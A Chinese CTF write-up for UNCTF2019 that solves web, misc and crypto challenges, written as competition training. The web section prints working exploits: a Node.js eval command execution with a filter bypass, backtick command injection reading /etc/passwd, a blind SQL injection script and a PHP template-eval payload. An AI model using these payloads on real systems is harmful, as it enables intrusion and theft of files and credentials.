# 题解 [web]

## checkin

查看源码，发现源码中的**/calc**

![](/home/cookie/Pictures/blogs/UNCTF2019/4.png)

尝试一下，这实际是一个计算器，后台逻辑估计是会将字符串输入到后台并执行。比如执行

```php
/calc 1+1
```

后台回显 2，所以这里存在命令执行漏洞。

参考文章：[Node.js代码审计之eval远程命令执行漏洞](<http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#%E5%8F%82%E8%80%83>)

​                   [child_process.execSync(command[, options])](<http://nodejs.cn/api/child_process.html#child_process_child_process_execsync_command_options>)

我们调用子进程进行命令执行

```
/calc require('child_process').execSync('ls').toString()
```

空格被过滤，使用${IFS}绕过

```php
/calc require('child_process').execSync('cat${IFS}/flag').toString()
```

![](/home/cookie/Pictures/blogs/UNCTF2019/5.png)











## bypass

```php
<?php
    highlight_file(__FILE__);
    $a = $_GET['a'];
    $b = $_GET['b'];
 // try bypass it
    if (preg_match("/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $a))
        $a = "";
        $a ='"' . $a . '"';
    if (preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $b))
        $b = "";
        $b = '"' . $b . '"';
     $cmd = "file $a $b";
      str_replace(" ","","$cmd"); 
     system($cmd);
?>
```

这里的反引号**' ` '**没有被过滤掉。

![](/home/cookie/Pictures/blogs/UNCTF2019/1.png)



遍历目录

![](/home/cookie/Pictures/blogs/UNCTF2019/2.png)



使用linux中的通配符还有/bin目录下文件的作用，我们可以使用被过滤掉的命令，如下：

```php
php > system("file `/b?n/?at /etc/passwd`");
```

![](/home/cookie/Pictures/blogs/UNCTF2019/3.png)



由于找不到flag文件的位置，所以使用如下命令获得flag

```php
http://101.71.29.5:10054/?a=`/b?n/gre?%20-R%20ctf`
```



flag:unctf{86dfe85d7c5842c5c04adae104193ee1}



## easy_admin

（1）发现找回密码处存在sql注入

然后过滤了select ，还有一些关键词，然后我们可以通过盲猜的方式获得密码

payload如下：

```php
admin' && substr(password,1,1)='f'#
```

因为密码估计也比较短，用burpsuit爆破一下就好了，获得用户名密码：flag{never_too

登录后，抓包在数据包中插入**referer: 127.0.0.1**获得后半段flag

![](/home/cookie/Pictures/blogs/UNCTF2019/24.png)

最终flag为：flag{never_too_late_to_x}







## 帮赵总征婚

这题，密码是随机的，直接使用一个大字典爆破，就好。狗屎运，一爆就出来了，拿了一个一血。。。。。

![](/home/cookie/Pictures/blogs/UNCTF2019/6.png)





## reset passwd

不放图了，一个逻辑漏洞，后台估计是通过session来判定是否接收到验证码

（1）注册一个用户，使用真实的邮箱

（2）找回密码，填写用户名，邮箱接收到验证码后，填写验证码，跳转至修改密码页面

（3）不要急着修改密码，在这个页面下点击登录，到登录页面后，再点找回密码，到需要填写用户名的页面

（4）填写用户名为admin，这时候要我们输入验证码，这时候再后退，后退到我们之前自己注册的账号，填写新密码的页面

（5）修改密码，登录，getflag......... 

![](/home/cookie/Pictures/blogs/UNCTF2019/22.png)







## 简单的备忘录

参考文章：[https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0](https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0)

![](/home/cookie/Pictures/blogs/UNCTF2019/7.png)



## 加密的备忘录





## Twice_insert

二次注入，然后源码就是sqlilab24关，几乎没有改动，username 来自于session，直接拼接没有过滤。不一样的地方就是，二次注入修改了admin的密码后，不能获得flag。但是在修改密码的地方存在漏洞。而且没有限制username的长度，这就意味着我们可以通过盲注来爆库。

```php
    $username= $_SESSION["username"];
	$curr_pass= mysql_real_escape_string($_POST['current_password']);
	$pass= mysql_real_escape_string($_POST['password']);
	$re_pass= mysql_real_escape_string($_POST['re_password']);
	
	if($pass==$re_pass)
	{	
		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
		$row = mysql_affected_rows();
		echo '<font size="3" color="#FFFF00">';
		echo '<center>';
		if($row==1)
		{
			echo "Password successfully updated";
	
		}
```



然后盲注有个问题在于information被waf掉了，导致我一直无法注出后续的东西。

参考：[<https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/>](<https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/>)

![](/home/cookie/Pictures/blogs/UNCTF2019/8.png)

exp如下：

```python
import requests


flag = ""
s = requests.Session()
for space in range(1,100):
    for i in range(48,123):
        #payload = "admin' and ascii(substr((select database()),%d,1))=%d##########################cookie12345678"%(space,i)
        #payload = "admin' and ascii(substr((select group_concat(distinct database_name) from mysql.innodb_index_stats),%d,1))=%d##########################cookie123456780121"%(space,i)
        #payload = "admin' and ascii(substr((select group_concat(distinct table_name) from mysql.innodb_index_stats),%d,1))=%d##########################cookie12345678"%(space,i)
        payload =  "admin' and ascii(substr((select * from fl4g),%d,1))=%d##########################cookie12345678"%(space,i)
        #print payload+"the character "+str(space)+" try --"+chr(i)
        
        url1 = 'http://101.71.29.5:10002/login_create.php'
        register_data = {"username":payload,"password":"123","re_password":"123","submit":"Register"}
        r_register = s.post(url1,data=register_data)

        
        url2 = 'http://101.71.29.5:10002/login.php'
        login_data = {"login_user":payload,"login_password":"123","mysubmit": "Login"}
        r_login = s.post(url2,data=login_data)

        url3 = 'http://101.71.29.5:10002/pass_change.php'
        update_data = {"current_password":"123","password":"12345"+str(i),"re_password":"12345"+str(i),"submit": "Reset"}
        r_update = s.post(url3,data=update_data)
        if "Password successfully updated" in r_update.text:
            flag = flag + chr(i)
            print "flag is ------>"+flag
            break

print flag
```





## 审计一下世界上最好的语言吧

获得源码，审计源码

全局搜索，在parse_template.php下看到**'eval()'**

```php
@eval("if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}");
```

一路溯源，漏洞触发需要经过如下几个环节

定位：index.php

```php
if ($n>0) {
	$searchword = $searchword[1][0]；
	if (strlen($searchword)>0){
		parse_again($searchword);
	}else{
		exit("searchword!!");
	}
}else{
	exit("input your searchword~");
}
```



跟踪parse_again()

定位：parse_template.php::parse_again()

```php
function parse_again(){
	global $template_html,$searchword;//$searchword={i{haha:type}
	$searchnum 	= isset($GLOBALS['searchnum'])?$GLOBALS['searchnum']:"";//searchnum={end%20if}
	$type 		= isset($GLOBALS['type'])?$GLOBALS['type']:"";//type=f:rea{haha:typename}
	$typename 	= isset($GLOBALS['typename'])?$GLOBALS['typename']:"";//typename=dfile(%27flag.php%27)}


	$searchword = substr(RemoveXSS($searchword),0,20);
	$searchnum = substr(RemoveXSS($searchnum),0,20);
	$type = substr(RemoveXSS($type),0,20);
	$typename = substr(RemoveXSS($typename),0,20);
	$template_html = str_replace("{haha:searchword}",$searchword,$template_html);
	$template_html = str_replace("{haha:searchnum}",$searchnum,$template_html);
	$template_html = str_replace("{haha:type}",$type,$template_html);
	$template_html = str_replace("{haha:typename}",$typename,$template_html);
	$template_html = parseIf($template_html);
	return $template_html;
}
```



跟进函数**parseIf()**

```php
function parseIf($content){
	if (strpos($content,'{if:')=== false){
            return $content;
    }else{
        $Rule = "/{if:(.*?)}(.*?){end if}/is";
        preg_match_all($Rule,$content,$iar);
        $arlen=count($iar[0]);
        $elseIfFlag=false;
        for($m=0;$m<$arlen;$m++){
            $strIf=$iar[1][$m];
            $strIf=parseStrIf($strIf);
            @eval("if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}");
        }
    }
    return $content;
}
```



在parseIf中，当$content中有**{if:**时，进入else语句。这里的正则规则如下

```php
/{if:(.*?)}(.*?){end if}/is
```



在parse_again()

```php
$template_html = file_get_contents("template.html");
```

然后一下这段代码：

```php
	$template_html = str_replace("{haha:searchword}",$searchword,$template_html);
	$template_html = str_replace("{haha:searchnum}",$searchnum,$template_html);
	$template_html = str_replace("{haha:type}",$type,$template_html);
	$template_html = str_replace("{haha:typename}",$typename,$template_html);
```

在temlate.html中全局搜索一下**{haha:searchword}**，以及**{haha:searchnum}**，发现有一处，这两个字符串是先后顺序

```html
<a href="#">{haha:searchword} </a> <small>共有<span class="sea-text">{haha:searchnum}</span>个影片 
```



那么为了触发eval()函数，我们可以把这两处分别替换成

```php
$searchword={i{haha:type}
$searchnum={end%20if}
```

替换成

```html
{i{haha:type} </a> <small>共有<span class="sea-text">{end if}
```

接着按照这个思路

```php
$type=f:rea{haha:typename}
$typename=dfile(%27flag.php%27)}
```

替换成

```php
{if:readfile(%27flag.php%27)} </a> <small>共有<span class="sea-text">{end if}
```

经过以下这段代码

```php
        preg_match_all($Rule,$content,$iar);
        $arlen=count($iar[0]);
        $elseIfFlag=false;
        for($m=0;$m<$arlen;$m++){
            $strIf=$iar[1][$m];
```

获得

```php
$strIf = readfile(%27flag.php%27)
```

然后获得flag

最终payload为：

```php
?content=<search>{i{haha:type}</search>
&searchnum={end%20if}&type=f:rea{haha:typename}&typename=dfile(%27flag.php%27)}
```



```html

<a href="www.zip">source code</a>
<br/>
<?php 
$flag = "UNCTF{5ee25610af306b625b4cadb4cb5fa24b}";
?>
```







# 题解[MISC]

## 快乐游戏题

![](/home/cookie/Pictures/blogs/UNCTF2019/17.png)

就打游戏，没啥好说的



## hidden_secret

题目修改了一下，感觉变简单了不少。

给了三个文件，找了一个zip文件包分析一下，题目给的三个数据实际上是zip文件包的三部分，按照zip文件的格式，补齐缺失的数据，在头部加上**50 4B**，然后按顺序拼上1,2,3三个部分的文件。

保存成一个zip包，解压，发现里面有一个2.jpg，binwalk跑一下，分离出一个1.txt，内容如下

```php
"K<jslc7b5'gBA&]_5MF!h5+E.@IQ&A%EExEzp\\X#9YhiSHV#"
```

发现这是base92加密，

参考：[<https://www.cnblogs.com/pcat/p/11625834.html>](<https://www.cnblogs.com/pcat/p/11625834.html>)

解密脚本如下:

```python
import base92
c= base92.decode("K<jslc7b5'gBA&]_5MF!h5+E.@IQ&A%EExEzp\\X#9YhiSHV#")
print c
```

![](/home/cookie/Pictures/blogs/UNCTF2019/25.png)





## happy_puzzle

hint1: png吧 hint2：data不是图片，要拼图 hint3：idat数据块

参考链接：[https://www.ffutop.com/posts/2019-05-10-png-structure/](https://www.ffutop.com/posts/2019-05-10-png-structure/)

​                   [https://blog.csdn.net/xuchen16/article/details/82587908]( https://blog.csdn.net/xuchen16/article/details/82587908)

png文件中必要的三个数据块：PNG文件格式头+IHDR+IDAT+IEND

![](/home/cookie/Pictures/blogs/UNCTF2019/12.png)



接着IDAT块的数据

![](/home/cookie/Pictures/blogs/UNCTF2019/13.png)



这题提供了很多.data文件，以及一个info.txt,告诉我们宽高是400。

思路：找一个png图片，将其PNG文件格式头+IHDR这一部分拿出来，作为flag.png的文件头。

![](/home/cookie/Pictures/blogs/UNCTF2019/14.png)



然后IDAT的部分根据：长度(2800bytes)+IDAT标识符+data+CRC

注：在windows下查看CRC图片是不需要校验CRC码的，所以我们在CRC码的位置可以补0使用windows查看图片。

![](/home/cookie/Pictures/blogs/UNCTF2019/15.png)



![](/home/cookie/Pictures/blogs/UNCTF2019/16.png)



基于这个想法，我们把所有的.data文件全部补齐成IDAT块。

然后拼到IHDR后面，如果该IDAT块是这个位置的，那个图片出来一条，错了则是马赛克，手动拼完，出flag

![](/home/cookie/Pictures/blogs/UNCTF2019/18.png)



## 信号不好我先挂了

考察lsb+盲水印

使用stegsolve中的lsb得出另外一张图片

接着使用工具BlindWaterMark-master，跑一下得到flag

![](/home/cookie/Pictures/blogs/UNCTF2019/19.png)





## 亲爱的

MP3用foremost跑一下

获得一个加密的文件

![](/home/cookie/Pictures/blogs/UNCTF2019/20.png)

密码在QQ音乐中海阔天空这首歌 2019.7.27   17:47这首歌的评论：真的上头

.......



## Think

```python
#coding:utf-8

print """
  ____   ___  _  ___    _   _ _   _  ____ _____ _____ 
 |___ \ / _ \/ |/ _ \  | | | | \ | |/ ___|_   _|  ___|
   __) | | | | | (_) | | | | |  \| | |     | | | |_   
  / __/| |_| | |\__, | | |_| | |\  | |___  | | |  _|  
 |_____|\___/|_|  /_/   \___/|_| \_|\____| |_| |_|    
"""

(lambda __y, __operator, __g, __print: [[[[(__print("It's a simple question. Take it easy. Don't think too much about it."), [(check(checknum), None)[1] for __g['checknum'] in [(0)]][0])[1] for __g['check'], check.__name__ in [(lambda checknum: (lambda __l: [(lambda __after: (__print('Congratulation!'), (__print(decrypt(key, encrypted)), __after())[1])[1] if __l['checknum'] else (__print('Wrong!'), __after())[1])(lambda: None) for __l['checknum'] in [(checknum)]][0])({}), 'check')]][0] for __g['decrypt'], decrypt.__name__ in [(lambda key, encrypted: (lambda __l: [[(lambda __after, __sentinel, __items: __y(lambda __this: lambda: (lambda __i: [[__this() for __l['c'] in [(__operator.iadd(__l['c'], chr((ord(__l['key'][(__l['i'] % len(__l['key']))]) ^ ord(__l['encrypted'][__l['i']].decode('base64').decode('hex'))))))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(lambda: __l['c'], [], iter(range(len(__l['encrypted'])))) for __l['c'] in [('')]][0] for __l['key'], __l['encrypted'] in [(key, encrypted)]][0])({}), 'decrypt')]][0] for __g['encrypted'] in [(['MTM=', 'MDI=', 'MDI=', 'MTM=', 'MWQ=', 'NDY=', 'NWE=', 'MDI=', 'NGQ=', 'NTI=', 'NGQ=', 'NTg=', 'NWI=', 'MTU=', 'NWU=', 'MTQ=', 'MGE=', 'NWE=', 'MTI=', 'MDA=', 'NGQ=', 'NWM=', 'MDE=', 'MTU=', 'MDc=', 'MTE=', 'MGM=', 'NTA=', 'NDY=', 'NTA=', 'MTY=', 'NWI=', 'NTI=', 'NDc=', 'MDI=', 'NDE=', 'NWU=', 'MWU='])]][0] for __g['key'] in [('unctf')]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('operator', level=0), globals(), __import__('__builtin__', level=0).__dict__['print'])
```

考察python代码审计，这里考察的匿名函数lambda的使用，实际上我也没大看懂，估计关键代码就是：

```python
[(check(checknum), None)[1] for __g['checknum'] in [(0)]][0])[1] for __g['check'], check.__name__ in [(lambda checknum: (lambda __l: [(lambda __after: (__print('Congratulation!'), (__print(decrypt(key, encrypted)), 
```



看到check(chekenum)，这估计是个检验输入内容的函数，运行一下试试.......

![](/home/cookie/Pictures/blogs/UNCTF2019/21.png)









# 题解[密码学]

## 不仅仅是RSA

压缩包里给出两个wav，目测有摩斯密码,脚本跑一下

![](/home/cookie/Pictures/blogs/UNCTF2019/9.png)

```
jagger@jagger-ubuntu:~/morsecc-master/morsecc-master$ python morsecc.py C1.wav 
[+] Morse Code:  _._. .____ ___... ...._ ...__ .____ ...._ ..___ ..... .____ ___.. ___.. .____ ..___ ...._ ..___ ___.. _____ ...__ ...__ ...._ ...__ _.... ...._ .____ ..___ ..... ___.. ...__ ..... _____ ___.. ...._ __... ...._ ..___ ...._ ..___ ...._ _____ .____ ____. __... ...__ ...._ ___.. ..___ __... _____ ____. ...__ ...._ ...__ __... _.... ..___ ____. ...__ __... ____. ..___ _____ ..... ...._ ____. ...__ ___.. ___.. _.... _____ __... ..... _.... ..___ _.... ..... __... ..___ __... ..... ...__ ..... .____ _.... ...__ ..___ .____ ___.. _.... _.... .____ _____ .____ ..___ __... ..... _.... ..___ _.... ...._ ...__ .____ ...._ __... .____ __... ..... ____. .____ .____ .____ __... ...__ ..... ..... __... ...__ _.... ..___ .____ ____. ___.. ___.. _____ .____ ..___ __... ..... ...__ ...._ ____. ..___ __... ...._ ____. ...._ ____. ___.. _.... .____ ..___ _____ ..... ...._ ..___ ...._ ___.. ..... __... ..___ .____ ...__ ...._ __... ...__ ..... .____
[+] Plain Text:  C1:4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351
jagger@jagger-ubuntu:~/morsecc-master/morsecc-master$ python morsecc.py C2.wav 
[+] Morse Code:  _._. ..___ ___... ...._ ___.. ..... .____ _.... ..___ ..___ _____ ____. ...__ ..... .____ ..... ..___ ..... ___.. _____ _____ ____. ...._ ___.. ____. ...._ .____ _.... .____ ...__ ____. __... __... ____. ...._ ..___ ...._ .____ _.... __... ...._ ...._ __... ...__ __... ...__ .____ _.... __... ..... ____. ..... .____ _.... .____ ..... __... ..___ ____. ..___ ...._ .____ _____ ____. _.... _____ ..... ...__ .____ ...._ __... ..... _____ ___.. ...__ ___.. _.... ...__ _.... _.... ...__ _____ .____ __... ..___ ..___ ____. ___.. ___.. ..___ ...._ ...__ _____ ___.. ..... ____. .____ _.... .____ ...._ ..... ___.. ____. _____ ____. ...._ __... ___.. ...._ .____ ..___ ...._ .____ ___.. _.... ...__ ____. .____ __... ..___ ..___ ...._ ____. _.... _.... _____ ___.. .____ ___.. ..___ ____. ____. _____ ____. ____. _.... .____ ___.. .____ ...._ ...__ ____. .____ ___.. _____ ___.. _____ ___.. _.... __... .____ ...__ ..___ ...__ ...._ ____.
[+] Plain Text:  C2:485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349
```



两个pem跑一下

![](/home/cookie/Pictures/blogs/UNCTF2019/10.png)



然后脚本一把梭

```python
import libnum
import gmpy2


n1 = 10285341668836655607404515118077620322010982612318568968318582049362470680277495816958090140659605052252686941748392508264340665515203620965012407552377979
e =0xa105
p1 = 95652716952085928904432251307911783641637100214166105912784767390061832540987
q1 = 107527961531806336468215094056447603422487078704170855072884726273308088647617
c1 = 4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351
d1 = gmpy2.invert(e,(p1-1)*(q1-1))
m1 = pow(c1,d1,n1)
print(libnum.n2s(m1))


n2 = 8559553750267902714590519131072264773684562647813990967245740601834411107597211544789303614222336972768348959206728010238189976768204432286391096419456339
p2 = 89485735722023752007114986095340626130070550475022132484632643785292683293897
q2 = 95652716952085928904432251307911783641637100214166105912784767390061832540987
c2 = 485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349
d2 = gmpy2.invert(e,(p2-1)*(q2-1))
m2 = pow(c2,d2,n2)
print(libnum.n2s(m2))
```

![](/home/cookie/Pictures/blogs/UNCTF2019/11.png)



























